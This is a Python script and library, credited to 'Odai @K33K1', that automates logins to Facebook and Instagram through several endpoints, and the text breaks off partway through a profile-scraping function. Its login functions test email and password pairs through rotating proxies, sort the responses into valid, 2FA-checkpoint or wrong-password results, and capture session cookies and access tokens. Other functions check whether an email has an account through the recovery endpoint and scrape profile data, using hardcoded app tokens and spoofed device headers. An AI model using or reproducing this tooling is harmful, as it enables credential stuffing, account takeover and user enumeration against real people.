# The Script And The Library For Odai @K33K1
# السكربت و المكتبة لعدي @K33K1
import requests
import httpx
import random
import string
import re
import json
import os
import time
import uuid
import base64
import secrets
import urllib3
import urllib.parse
import hashlib
from uuid import uuid4
from secrets import token_hex
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime
class Proxy:

    SUPPORTED_SCHEMES = {"http", "https", "socks4", "socks5"}

    @staticmethod
    def build(proxy_input):
        if not proxy_input:
            return None

        # ✅ إذا dict (جاهز)
        if isinstance(proxy_input, dict):
            return proxy_input

        # ✅ إذا list (ياخذ أول صالح)
        if isinstance(proxy_input, list):
            for p in proxy_input:
                parsed = Proxy.build(p)
                if parsed:
                    return parsed
            return None

        # نحول لـ string
        proxy_str = str(proxy_input).strip()

        if not proxy_str:
            return None

        proxy_str = proxy_str.replace(" ", "")

        # ===== scheme =====
        if "://" in proxy_str:
            scheme, rest = proxy_str.split("://", 1)
            scheme = scheme.lower()
        else:
            scheme = "http"
            rest = proxy_str

        if scheme not in Proxy.SUPPORTED_SCHEMES:
            scheme = "http"

        # ===== auth =====
        if "@" in rest:
            auth, host_part = rest.split("@", 1)

            if ":" in auth:
                user, password = auth.split(":", 1)
            else:
                user, password = auth, ""
        else:
            user = password = None
            host_part = rest

        # ===== formats =====
        parts = host_part.split(":")

        if len(parts) == 4:
            host, port, user, password = parts
        elif len(parts) == 2:
            host, port = parts
        else:
            return None

        # ===== build =====
        if user and password:
            proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
        else:
            proxy_url = f"{scheme}://{host}:{port}"

        return {
            "http": proxy_url,
            "https": proxy_url
        }

    @staticmethod
    def raw(proxy_input):
        """يرجع string بدل dict"""
        parsed = Proxy.build(proxy_input)
        if not parsed:
            return None
        return parsed["http"]
def extract_cookies(text):
    for _ in range(5):text = text.replace('\\"', '"').replace('\\\\', '\\')
    start_match = re.search(r'"session_cookies"\s*:\s*\[', text)
    if not start_match:return None
    start_idx = start_match.end() - 1
    i = start_idx
    bracket_count = 0
    in_string = False
    escape = False
    while i < len(text):
        ch = text[i]
        if escape:escape = False
        elif ch == '\\':escape = True
        elif ch == '"':in_string = not in_string
        elif not in_string:
            if ch == '[':bracket_count += 1
            elif ch == ']':
                bracket_count -= 1
                if bracket_count == 0:
                    end_idx = i
                    break
        i += 1
    else:return None
    array_content = text[start_idx+1:end_idx]
    cookie_pairs = re.findall(r'"name"\s*:\s*"([^"]+)"\s*,\s*"value"\s*:\s*"([^"]+)"',array_content)
    if not cookie_pairs:return None
    cookie_dict = {name: value for name, value in cookie_pairs}
    order = ["c_user", "xs", "fr", "datr"]
    parts = []
    for name in order:
        if name in cookie_dict:parts.append(f"{name}={cookie_dict[name]}")
    return "; ".join(parts)
class facebook:
    @staticmethod
    def basic(email, password, proxies=None):
        r = requests.get("https://www.facebook.com/?_rd")
        m = re.search(r'privacy_mutation_token\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-:.]+)', r.text)
        token = m.group(1) if m else None
        cok = r.cookies
        fr = cok.get('fr', '')
        session = requests.Session()
        session.cookies.update(cok.get_dict())
        headers = {"user-agent": "Mozilla/5.0"}
        url = "https://accountscenter.facebook.com/"
        res = session.get(url, headers=headers).text
        lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
        lsd = lsd_match.group(1) if lsd_match else None
        cookies = {'datr': '1uBDaYSNCnmSWNXK148RNXci','sb': '1uBDaSJj0uSvPcQFj-09YEP-','ps_l': '1','ps_n': '1','dpr': '2.8035895824432373','m_pixel_ratio': '2.549999952316284','fr': fr,'wd': '891x815'}
        headers = {'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','dpr': '2.549999952316284','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/?_rdr','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Linux"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','viewport-width': '980'}
        data = {'jazoest': '21013','lsd': lsd,'user': email,'login_source': 'comet_headerless_login','next': '','encpass': f'PWD_BROWSER:0:{int(time.time())}:{password}'}
        try: 
            response = session.post(f'https://www.facebook.com/login/?privacy_mutation_token={token}&next',cookies=cookies,headers=headers,data=data,proxies = Proxy.build(proxies)).text
            account_id = re.search(r'ACCOUNT_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
            user_id = re.search(r'USER_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
            username = re.search(r'USERNAME["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_.]+)', response)
            if (account_id and account_id.group(1) != "0" and user_id and user_id.group(1) != "0" and username and username.group(1) != "0"):return {"status": "success","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33K1"}
            elif ('Please complete the security check to log in.' in response or 'two_step_verification' in response or '2fa' in response.lower()):return {"status": "checkpoint","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33K1"}
            elif ('كلمة السر التي أدخلتها غير صحيحة.' in response or 'هل نسيت كلمة السر؟' in response):return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33K1"}
            elif 'البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.' in response:return {"status": "user not found","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
    @staticmethod
    def auth(email, password, proxies=None):
        data = {"locale": "en_GB","format": "json","user": email,"password": password,"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies": 1}
        headers = {'user-agent': 'Mozilla/5.0','Host': 'graph.facebook.com','Content-Type': 'application/json;charset=utf-8'}
        try:
            response = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,proxies = Proxy.build(proxies))
            result = response.json()
            text = response.text
            if 'access_token' in result or 'session_key' in result:
                uid = result.get('uid', '')
                cookies = ';'.join(i['name'] + '=' + i['value'] for i in result.get('session_cookies', []))
                return {"status": "success","uid": uid,"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33K1"}
            elif ('www.facebook.com' in result.get('error', {}).get('message', '') or 'Please complete the security check to log in.' in text or 'two_step_verification' in text):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33K1"}
            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
    @staticmethod
    def mobile(email, password, proxies=None):
        payload = {'method': "post", 'pretty': "false", 'format': "json", 'server_timestamps': "true", 'locale': "en_EN", 'purpose': "fetch", 'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request", 'fb_api_caller_class': "graphservice", 'client_doc_id': "11994080425074657009809260413", 'fb_api_client_context': json.dumps({"is_background": False}), 'variables': json.dumps({"params": {"params": json.dumps({"params": json.dumps({"client_input_params": {"sim_phones": [], "aymh_accounts": [{"profiles": {"id": {"is_derived": 0, "credentials": [], "account_center_id": "", "profile_picture_url": "", "small_profile_picture_url": None, "notification_count": 0, "token": "", "last_access_time": 0, "has_smartlock": 0, "credential_type": "none", "password": "", "from_accurate_privacy_result": 0, "dbln_validated": 0, "user_id": "", "name": "", "nta_eligibility_reason": None, "username": "", "account_source": ""}}, "id": ""}], "secure_family_device_id": str(uuid4()), "attestation_result": {}, "has_granted_read_contacts_permissions": 0, "auth_secure_device_id": "null", "has_whatsapp_installed": 1, "password": f"#PWD_FB4A:0:{str(int(time.time()))}:{password}", "sso_token_map_json_string": "", "block_store_machine_id": None, "cloud_trust_token": None, "event_flow": "login_manual", "password_contains_non_ascii": "false", "sim_serials": [], "client_known_key_hash": "", "encrypted_msisdn": "", "has_granted_read_phone_permissions": 0, "app_manager_id": str(uuid4()), "should_show_nested_nta_from_aymh": 1, "device_id": str(uuid4()), "zero_balance_state": "data", "login_attempt_count": 1, "flash_call_permission_status": {"READ_PHONE_STATE": "DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"}, "accounts_list": [], "family_device_id": str(uuid4()), "fb_ig_device_id": [], "device_emails": [], "try_num": 3, "lois_settings": {"lois_token": ""}, "event_step": "home_page", "headers_infra_flow_id": str(uuid4()), "openid_tokens": {}, "contact_point": email}, "server_params": {"should_trigger_override_login_2fa_action": 0, "is_vanilla_password_page_empty_password": 0, "is_from_logged_out": 0, "should_trigger_override_login_success_action": 0, "login_credential_type": "none", "server_login_source": "login", "waterfall_id": str(uuid4()), "two_step_login_type": "one_step_login", "login_source": "Login", "is_platform_login": 0, "pw_encryption_try_count": 1, "INTERNAL__latency_qpl_marker_id": 36707139, "is_from_aymh": 0, "offline_experiment_group": None, "is_from_landing_page": 0, "password_text_input_id": None, "is_from_empty_password": 0, "is_from_msplit_fallback": 0, "ar_event_source": "login_home_page", "username_text_input_id": None, "layered_homepage_experiment_group": None, "device_id": str(uuid4()), "INTERNAL__latency_qpl_instance_id": 1.06996309100672e14, "reg_flow_source": "login_home_native_integration_point", "is_caa_perf_enabled": 1, "credential_type": "password", "is_from_password_entry_page": 0, "caller": "gslr", "family_device_id": str(uuid4()), "is_from_assistive_id": 0, "access_flow_version": "pre_mt_behavior", "is_from_logged_in_switcher": 0}})}), "bloks_versioning_id": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a", "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"}, "scale": "3", "nt_context": {"using_white_navbar": True, "styles_id": "3b115a54b620c39392b96bdca4c5237f", "pixel_ratio": 3, "is_push_on": True, "debug_tooling_metadata_token": None, "is_flipper_enabled": False, "theme_params": [{"value": [], "design_system_name": "FDS"}], "bloks_version": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a"}}), 'fb_api_analytics_tags': json.dumps(["GraphServices"]), 'client_trace_id': "a5bba4f8-b87f-4b73-8d9a-44226255a84c"}
        headers = {'User-Agent': "[FBAN/FB4A;FBAV/536.0.0.46.77;FBBV/810163229;FBDM/{density=2.75,width=1080,height=2220};FBLC/en_EN;FBRV/0;FBCR/Yemen Mobile;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 10 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",'x-fb-friendly-name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",'authorization': "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
        try:
            response = requests.post("https://graph-fallback.facebook.com/graphql",data=payload,headers=headers,proxies = Proxy.build(proxies))
            response_text = response.text
            if re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", "")):
                token_match = re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", ""))
                cookies = extract_cookies(response.text)
                return {"status": "success","access_token": token_match.group(1),"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33K1"}
            elif "Invalid username or password" in response_text or 'override_login_2fa_action' in response_text:return {"status": "bad credentials","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
    @staticmethod
    def ig_auth(email, password, proxies=None):
        cookies = {'datr': '', 'dpr': '1.25', 'ps_l': '1', 'ps_n': '1', 'sb': '', 'fr': '', 'wd': '834x826'}
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1.25', 'origin': 'https://web.facebook.com', 'priority': 'u=0, i', 'referer': 'https://web.facebook.com/ig_xsite_user_info/?_rdc=1&_rdr', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"', 'sec-ch-ua-full-version-list': '"Chromium";v="146.0.7680.165", "Not-A.Brand";v="24.0.0.0", "Google Chrome";v="146.0.7680.165"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36', 'viewport-width': '834'}
        try:
            page_req = requests.get('https://accountscenter.instagram.com/',headers=headers,proxies = Proxy.build(proxies))
            page = page_req.text
            cookies.update(page_req.cookies.get_dict())
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', page)
            lsd = lsd_match.group(1) if lsd_match else ""
            headers['x-fb-lsd'] = lsd
            params = {'login_attempt': '1','lwv': '110'}
            data = {'jazoest': '22360', 'lsd': lsd, 'email': email, 'pass': password, 'timezone': '-180', 'lgndim': 'eyJ3IjoxNTM2LCJoIjo5NjAsImF3IjoxNTM2LCJhaCI6OTEyLCJjIjozMn0=', 'lgnrnd': '225140_iQTj', 'lgnjs': 'n', 'ab_test_data': '', 'locale': 'en_US', 'shared_prefs_data': '', 'next': 'https://web.facebook.com/ig_xsite_user_info/', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': ''}
            r = requests.post('https://web.facebook.com/login/device-based/regular/login/', params=params, cookies=cookies, headers=headers, data=data, proxies = Proxy.build(proxies))
            response = r.text
            if 'The password you’ve entered is incorrect' in response:return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33K1"}
            elif 'The email you entered isn’t connected to an account' in response:return {"status": "user not found","user": email,"password": password,"Dev": "Odai @K33K1"}
            elif ('Enter the security code' in response):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33K1"}
            elif "Please Confirm Password" in response:return {"status": "correct but typo","user": email,"password": password,"Dev": "Odai @K33K1"}
            env_match = re.search(r'<script id="envjson" type="application/json">(.*?)</script>', response, re.DOTALL)
            account_data = None
            if env_match:
                try:env_json = json.loads(env_match.group(1));account_data = env_json.get("CurrentUserInitialData", {})
                except:pass
            if not account_data or not account_data.get("ACCOUNT_ID"):
                alt_match = re.search(r'"ACCOUNT_ID"\s*:\s*"(\d+)"', response)
                if alt_match and alt_match.group(1) not in ("0", ""):
                    account_id = alt_match.group(1)
                    name_match = re.search(r'"NAME"\s*:\s*"([^"]+)"', response)
                    name = name_match.group(1) if name_match else "Unknown"
                    account_data = {"ACCOUNT_ID": account_id, "NAME": name}
            if account_data and account_data.get("ACCOUNT_ID", "0") not in ("0", "", "null"):return {"status": "success","account_id": account_data.get("ACCOUNT_ID"),"name": account_data.get("NAME", "Unknown"),"cookies": r.cookies.get_dict(),"user": email,"password": password,"Dev": "Odai @K33K1"}
            else:return {"status": "unknown response","user": email,"password": password,"Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
    def __init__(self):
        self.session    = requests.Session()
        self.user_agent = (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        )
        self.session.headers.update({
            'User-Agent'              : self.user_agent,
            'Accept'                  : (
                "text/html,application/xhtml+xml,application/xml;"
                "q=0.9,image/avif,image/webp,image/apng,*/*;"
                "q=0.8,application/signed-exchange;v=b3;q=0.7"
            ),
            'Accept-Language'         : "en-US,en;q=0.9",
            'Sec-Fetch-Dest'          : "document",
            'Sec-Fetch-Mode'          : "navigate",
            'Sec-Fetch-Site'          : "none",
            'Sec-Fetch-User'          : "?1",
            'Upgrade-Insecure-Requests': "1",
            'sec-ch-ua'               : '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile'        : "?1",
            'sec-ch-ua-platform'      : '"Android"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-model'         : '"SM-S908E"',
        })
        self.tokens      = {}
        self.req_counter = 1
    def extract_tokens(self, html: str) -> None:
        dtsg = re.search(r'"dtsg":\{"token":"([^"]+)"', html)
        if dtsg:
            self.tokens['fb_dtsg'] = dtsg.group(1)

        lsd = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', html)
        if lsd:
            self.tokens['lsd'] = lsd.group(1)
        else:
            lsd2 = re.search(r'"lsd":"([^"]+)"', html)
            if lsd2:
                self.tokens['lsd'] = lsd2.group(1)

        jaz = re.search(r'initSprinkleValue":"([0-9]+)"', html)
        if jaz:
            self.tokens['jazoest'] = jaz.group(1)
        else:
            jaz2 = re.search(r'"jazoest","([0-9]+)"', html)
            if jaz2:
                self.tokens['jazoest'] = jaz2.group(1)

        bkv = re.search(r'versioningID:"([^"]+)"', html)
        if bkv:
            self.tokens['__bkv'] = bkv.group(1)

        rev = re.search(r'"server_revision":(\d+)', html)
        if rev:
            self.tokens['__rev'] = rev.group(1)

        hsi = re.search(r'"hsi":"([^"]+)"', html)
        if hsi:
            self.tokens['__hsi'] = hsi.group(1)

        hs = re.search(r'"haste_session":"([^"]+)"', html)
        if hs:
            self.tokens['__hs'] = hs.group(1)
        dyn = re.findall(r'\"(0[0-9A-Za-z_\-]{50,})\"', html)
        if dyn:
            self.tokens['__dyn'] = max(dyn, key=len)
        else:
            self.tokens['__dyn'] = (
                "0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLC"
                "JmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0"
            )
    @staticmethod
    def _gen_s() -> str:
        return ":".join(secrets.token_hex(3) for _ in range(3))

    def _next_req(self) -> str:
        val    = self.req_counter
        self.req_counter += 1
        result = ""
        while val > 0:
            val, rem = divmod(val - 1, 26)
            result   = chr(ord('a') + rem) + result
        return result

    def get_full_cookies_string(self) -> str:
        return "; ".join(
            f"{k}={v}" for k, v in self.session.cookies.get_dict().items()
        )
    def blockslogin(self, username: str, password: str, proxies=None) -> bool:
        page = self.session.get(
            "https://m.facebook.com/",
            headers={
                'Sec-Fetch-Dest': "document",
                'Sec-Fetch-Mode': "navigate",
                'Sec-Fetch-Site': "none",
                'Sec-Fetch-User': "?1",
            }
        )
        self.extract_tokens(page.text)
        timestamp    = str(int(time.time()))
        password_enc = f"#PWD_BROWSER:0:{timestamp}:{password}"
        fresh_s      = self._gen_s()
        fresh_req    = self._next_req()

        params_json = json.dumps({
            "params": json.dumps({
                "server_params": {
                    "credential_type"                              : "password",
                    "username_text_input_id"                       : "2c17gb:74",
                    "password_text_input_id"                       : "2c17gb:75",
                    "login_source"                                 : "Login",
                    "login_credential_type"                        : "none",
                    "server_login_source"                          : "login",
                    "ar_event_source"                              : "login_home_page",
                    "should_trigger_override_login_success_action" : 0,
                    "should_trigger_override_login_2fa_action"     : 0,
                    "is_caa_perf_enabled"                          : 0,
                    "reg_flow_source"                              : "login_home_native_integration_point",
                    "caller"                                       : "gslr",
                    "is_from_landing_page"                         : 0,
                    "is_from_empty_password"                       : 0,
                    "is_from_aymh"                                 : 0,
                    "is_from_password_entry_page"                  : 0,
                    "is_from_assistive_id"                         : 0,
                    "is_from_msplit_fallback"                      : 0,
                    "two_step_login_type"                          : "one_step_login",
                    "left_nav_button_action"                       : "NONE",
                    "INTERNAL__latency_qpl_marker_id"              : 36707139,
                    "INTERNAL__latency_qpl_instance_id"            : str(int(time.time() * 1000)),
                    "device_id"                                    : None,
                    "family_device_id"                             : None,
                    "waterfall_id"                                 : str(uuid.uuid4()),
                    "offline_experiment_group"                     : None,
                    "layered_homepage_experiment_group"            : None,
                    "is_platform_login"                            : 0,
                    "is_from_logged_in_switcher"                   : 0,
                    "is_from_logged_out"                           : 0,
                    "access_flow_version"                          : "pre_mt_behavior",
                    "login_surface"                                : "login_home",
                    "login_entry_point"                            : "logged_out"
                },
                "client_input_params": {
                    "machine_id"                              : "",
                    "cloud_trust_token"                       : None,
                    "block_store_machine_id"                  : "",
                    "zero_balance_state"                      : "",
                    "contact_point"                           : username,
                    "password"                                : password_enc,
                    "accounts_list"                           : [],
                    "fb_ig_device_id"                         : [],
                    "secure_family_device_id"                 : "",
                    "encrypted_msisdn"                        : "",
                    "headers_infra_flow_id"                   : "",
                    "try_num"                                 : 1,
                    "login_attempt_count"                     : 1,
                    "event_flow"                              : "login_manual",
                    "event_step"                              : "home_page",
                    "openid_tokens"                           : {},
                    "auth_secure_device_id"                   : "",
                    "client_known_key_hash"                   : "",
                    "has_whatsapp_installed"                  : 0,
                    "sso_token_map_json_string"               : "",
                    "should_show_nested_nta_from_aymh"        : 0,
                    "gms_incoming_call_retriever_eligibility" : "client_not_supported",
                    "password_contains_non_ascii"             : "false",
                    "has_granted_read_contacts_permissions"   : 0,
                    "has_granted_read_phone_permissions"      : 0,
                    "app_manager_id"                          : "",
                    "aymh_accounts"                           : [],
                    "sso_accounts_auth_data": [],
                    "network_bssid"         : None,
                    "lois_settings"         : {"lois_token": ""},
                    "aac"                   : ""
                }
            })
        })

        post_data = {
            '__aaid'  : '0',
            '__user'  : '0',
            '__a'     : '1',
            '__req'   : fresh_req,
            '__hs'    : self.tokens.get('__hs', ''),
            'dpr'     : '3',
            '__ccg'   : 'GOOD',
            '__rev'   : self.tokens.get('__rev', ''),
            '__s'     : fresh_s,
            '__hsi'   : self.tokens.get('__hsi', ''),
            '__dyn'   : self.tokens.get('__dyn', ''),
            'fb_dtsg' : self.tokens.get('fb_dtsg', ''),
            'jazoest' : self.tokens.get('jazoest', ''),
            'lsd'     : self.tokens.get('lsd', ''),
            'params'  : params_json,
        }
        post_headers = {
            'authority'                 : 'm.facebook.com',
            'accept'                    : '*/*',
            'accept-language'           : 'en-US,en;q=0.9',
            'content-type'              : 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin'                    : 'https://m.facebook.com',
            'referer'                    : 'https://m.facebook.com/',
            'sec-ch-ua'                 : '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile'          : '?1',
            'sec-ch-ua-platform'        : '"Android"',
            'sec-fetch-dest'            : 'empty',
            'sec-fetch-mode'            : 'cors',
            'sec-fetch-site'            : 'same-origin',
            'user-agent'                : self.user_agent,
            'x-fb-friendly-name'        : 'loginWithPasswordMutation',
        }

        self.session.cookies.set('ps_l', '1', domain='.facebook.com')
        self.session.cookies.set('ps_n', '1', domain='.facebook.com')

        url_params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type' : 'action',
            '__bkv': self.tokens.get('__bkv', ''),
        }

        response = self.session.post(
            'https://m.facebook.com/async/wbloks/fetch/',
            params  = url_params,
            headers = post_headers,
            data    = post_data
        )
        cookies_dict = self.session.cookies.get_dict()
        if 'c_user' in cookies_dict or 'sessionid' in cookies_dict:
            return {"status": "success","cookies": self.get_full_cookies_string(),"user": username,"password": password,"Dev": "Odai @K33K1"}
        elif 'two_step_verification.' in response.text:
            return {"status": "checkpoint","user": username,"password": password,"Dev": "Odai @K33K1"}
        elif "Invalid username or password" in response.text or "Incorrect Password" in response.text:
            return {"status": "wrong credentials","user": username,"password": password,"Dev": "Odai @K33K1"}
        elif 'We can help you log into your account if you' in response.text:
            return {"status": "user not found","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
        else:
            return {"status": "unknown response","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
    @staticmethod
    def check_email(email: str, proxies=None) -> dict:
        try:
            device_id = str(uuid4())
            machine_id = str(uuid4())
            r = requests.post("https://b-graph.facebook.com/recover_accounts", headers={"Content-Type": "application/x-www-form-urlencoded", "X-Fb-Request-Analytics-Tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}', "Accept-Encoding": "gzip", "X-Fb-Friendly-Name": "accountRecoverySearch", "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", "User-Agent": "[FBAN/FB4A;FBAV/417.0.0.33.65;FBBV/480086274;...]", "X-Fb-Sim-Hni": "41805", "X-Fb-Device-Group": "3338", "X-Fb-Connection-Quality": "EXCELLENT", "X-Fb-Net-Hni": "41805", "X-Tigon-Is-Retry": "False", "X-Fb-Connection-Type": "WIFI", "Priority": "u=3,i", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True", "X-Fb-Server-Cluster": "True"}, data=(f"q={email}&friend_name=&qs=&summary=true&device_id={device_id}&src=fb4a_account_recovery&machine_id={machine_id}&sfdid={str(uuid4())}&fdid={device_id}&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32").encode("utf-8"), proxies=Proxy.build(proxies), timeout=15)
            try:js = r.json()
            except:js = json.loads(r.text)
            total_count = js.get("summary", {}).get("total_count")
            if total_count is not None:
                if total_count != 0:return {"status": "found", "email": email, "Dev": "Odai @K33K1"}
                else:return {"status": "not found", "email": email, "Dev": "Odai @K33K1"}
            elif "The action attempted has been deemed abusive or is otherwise disallowed" in r.text:return {"status": "blocked", "email": email, "Dev": "Odai @K33K1"}
            else:return {"status": "unknown", "email": email, "raw": js, "Dev": "Odai @K33K1"}
        except Exception as e:return {"status": "error", "error": str(e), "email": email, "Dev": "Odai @K33K1"}
    class account_info:
        @staticmethod
        def osint(username_or_id_or_link: str, check_other: bool = False, proxies=None) -> dict:
            Dev = "Odai @K33K1"
            def follow_redirects(url, max_redirects=10):
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                for _ in range(max_redirects):
                    try:
                        resp = requests.get(url, headers=headers, proxies=Proxy.build(proxies),timeout=10, allow_redirects=False)
                        if resp.status_code in (301, 302, 303, 307, 308):
                            url = resp.headers.get("Location", url)
                            if not url.startswith("http"):
                                from urllib.parse import urljoin
                                url = urljoin(resp.url, url)
                        else:return url
                    except:return url
                return url
            def extract_username_from_url(url):
                if "facebook.com/" in url:
                    part = url.split("facebook.com/")[-1].split("?")[0].split("#")[0].rstrip("/")
                    if part.startswith("profile.php?id="):return part.split("id=")[-1]
                    elif part.startswith("pg/"):return part.split("pg/")[-1].split("/")[0]
                    else:return part if part else None
                return None
            try:
                original_input = username_or_id_or_link.strip()
                if "facebook.com" in original_input or "fb.com" in original_input or original_input.startswith("http"):
                    target_url = follow_redirects(original_input)
                    extracted_username = extract_username_from_url(target_url)
                    if not extracted_username:return {"status": "error", "message": "Could not extract username from URL.", "data": None, "Dev": Dev}
                    final_username_or_id = extracted_username
                    profile_url = f"https://www.facebook.com/{final_username_or_id}"
                elif original_input.isdigit():
                    final_username_or_id = original_input
                    profile_url = f"https://www.facebook.com/{final_username_or_id}"
                else:
                    final_username_or_id = original_input
                    profile_url = f"https://www.facebook.com/{final_username_or_id}"
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.9","Cache-Control": "max-age=0","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "none","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}
                resp = requests.get(profile_url, headers=headers, proxies=Proxy.build(proxies),timeout=15, allow_redirects=True)
                if resp.status_code != 200 or "Sorry, something went wrong." in resp.text:
                    return {"status": "error","message": "Facebook returned an error page (possibly blocked or invalid account).","data": None,"Dev": Dev}
                soup = BeautifulSoup(resp.text, 'html.parser')
                info = {}
                title_tag = soup.find('title')
